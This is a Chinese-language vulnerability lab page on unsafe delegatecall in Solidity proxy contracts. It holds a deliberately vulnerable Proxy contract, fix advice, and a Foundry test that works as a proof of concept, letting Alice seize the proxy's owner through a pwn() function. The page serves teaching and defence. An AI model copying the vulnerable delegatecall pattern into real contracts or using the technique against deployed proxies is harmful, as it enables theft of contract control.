# 不安全委托调用
[Delegatecall.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Delegatecall.sol)  
**名称：** 不安全委托调用漏洞
**描述：**  
代理合约所有者操纵漏洞是智能合约设计中的缺陷，这种缺陷允许攻击者操纵代理合约的owner，并且将其硬编码为0xdeadbeef。  
这个漏洞的产生是由于在代理合约的回退函数中使用了delegatecall。   
delegatecall允许攻击者在代理合约上下文中从委托合约调用pwn()函数，从而改变代理合约owner状态变量的值。  
这允许智能合约在运行时从不同的地址动态加载代码。  

**场景：**  
代理合约为了帮助用户调用逻辑合约而设计的
代理合约的owner被硬编码为0xdeadbeef  
你可以操纵代理合约的owner吗？  


**修复建议：**  
为了缓解代理合约所有者操纵漏洞，除非明确要求，否则不要使用delegatecall,并确保安全的使用delegatecall。  
如果delegatecall对于合约的功能是必要的，请确保验证和清理输入以避免意外情况。  


**Proxy 合约：**  
```
contract Proxy {
    address public owner = address(0xdeadbeef); // slot0
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc, ) = address(delegate).delegatecall(msg.data); // 漏洞
        require(suc, "Delegatecall failed");
    }
}
```     


**如何测试：**  

forge test --contracts src/test/Delegatecall.sol-vvvv 
```
// 测试使用delegatecall的场景的函数
function testDelegatecall() public {
    // 初始化一个新的委托合约，即“逻辑合约”。
    DelegateContract = new Delegate(); 
    // 初始化一个新的代理合约，将委托合约的地址传递给构造函数。这就是“代理合约”。
    proxy = new Proxy(address(DelegateContract)); 

    // 记录Alice的地址。
    console.log("Alice address", alice);
    // 记录代理合约的所有者。
    console.log("DelegationContract owner", proxy.owner());

    // 记录更改代理合约所有者操作的开始
    console.log("Change DelegationContract owner to Alice...");
    // 设置消息的发送者为Alice。
    vm.prank(alice);
    // 通过delegatecall 调用Delegate合约的pwn函数.这就是漏洞。
    address(proxy).call(abi.encodeWithSignature("pwn()")); 
    // Proxy.fallback()将委托调用Delegate.pwn(), 使得Alice成为代理合约的所有者。

    // 记录代理合约的新的所有者。
    console.log("DelegationContract owner", proxy.owner());
    // 记录漏洞攻击完成。
    console.log(
        "Exploit completed, proxy contract storage has been manipulated"
    );
}

// Delegate 合约, 包含了可以通过delegatecall调用的代码。
contract Delegate {
    // 合约的所有者。
    address public owner; // slot0

    // pwn 函数, 将合约的所有者设置为消息发送者。
    function pwn() public {
        owner = msg.sender;
    }
}
```  
**红框：** 攻击成功，owner已经更改
![Alt text](image-2.png)
